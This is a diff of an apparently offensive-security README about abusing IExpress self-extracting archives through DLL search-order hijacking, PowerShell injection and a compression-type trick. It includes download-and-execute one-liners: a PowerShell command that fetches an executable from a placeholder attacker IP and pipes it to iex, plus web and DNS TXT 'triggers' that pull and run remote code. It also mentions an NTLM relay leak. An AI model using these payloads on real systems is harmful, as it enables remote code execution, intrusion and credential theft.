@@ -85,13 +85,13 @@ In this stage the attacker already has a evil payload working or at least a rev 
 
 ### [00] INTRODUCTION
 IExpress vulnerability described in 1.3.6.1.4.1.25623.1.0.813808. It seems the issue with IExpress is that it can create packages which can be exploited by a vulnerability in some unpacker in the wild, but IExpress in itself is not vulnerable. The problem, as I understand it, is as follows:
-> - IExpress creates a self-extracting program which allows files to be extracted to locations outside of the current working directory, and includes a set of instructions for executing the files once they’re extracted.
-> - A malicious .dll is placed in the same folder as the self-extracting archive.
+- IExpress creates a self-extracting program which allows files to be extracted to locations outside of the current working directory, and includes a set of instructions for executing the files once they’re extracted.
+- A malicious .dll is placed in the same folder as the self-extracting archive.
 When the archive is executed, it first extracts the files and then runs them as required by the onboard instructions. The problem is that when it looks for a specific file, it searches in the current working directory before it checks the absolute path specified by the instructions.
-> - If a malicious .dll resides in the same directory as a self-extracting archive created by IExpress, and shares a filename with one of the archived files, but not its path, that malicious .dll may be executed by the archive upon extraction.
-> - Injection of completes powershell commands.
-> - IExpress uses makecab in order to create the cab/exe files. But internally at Microsoft there is a tool called DIAMOND.EXE that act similarly to makecab (btw the DDF files that we are passing to makecab are called like that because of this. Short for DIAMOND Directive File).
-> - Specify a special compression type called "QUANTUM" inside the .SED file that we pass to IExpress we can make it invoke DIAMOND.EXE (which does NOT exists on modern Windows Machine) instead they use makecab.exe.
+- If a malicious .dll resides in the same directory as a self-extracting archive created by IExpress, and shares a filename with one of the archived files, but not its path, that malicious .dll may be executed by the archive upon extraction.
+- Injection of completes powershell commands.
+- IExpress uses makecab in order to create the cab/exe files. But internally at Microsoft there is a tool called DIAMOND.EXE that act similarly to makecab (btw the DDF files that we are passing to makecab are called like that because of this. Short for DIAMOND Directive File).
+- Specify a special compression type called "QUANTUM" inside the .SED file that we pass to IExpress we can make it invoke DIAMOND.EXE (which does NOT exists on modern Windows Machine) instead they use makecab.exe.
 
 **NOTE**
 
@@ -190,26 +190,21 @@ ps> powershell iwr  http://ATTACKERIP:TCPORT/bOlO.exe | iex
 ```
 
 [2] Obfuscate Basic payload: Change IPADDRESS and TCPPORT
-
-**Note:**
-It can be hosted as txt on a web server or as TXT record in a DNS server\
-
-
-> - **Web Trigger**
->
->```bash
->ps> iwr http://domain_oneline.txt | iex
->```
->
-> - **DNS Trigger**
->
->```bash
->ps> (Resolve-DnsName domain_oneline.txt -Type TXT).strings -join '' | iex
->```
-
-
 [`Obfuscate`](./tools/triggers/oneline.txt)
+**Note:**
+It can be hosted as txt on a web server or as TXT record in a DNS server.
 
+- **Web Trigger**
+
+```bash
+ps> iwr http://domain_oneline.txt | iex
+```
+
+ - **DNS Trigger**
+
+```bash
+ps> (Resolve-DnsName domain_oneline.txt -Type TXT).strings -join '' | iex
+```
 
 [3] Leak Link NTLM Relay
 
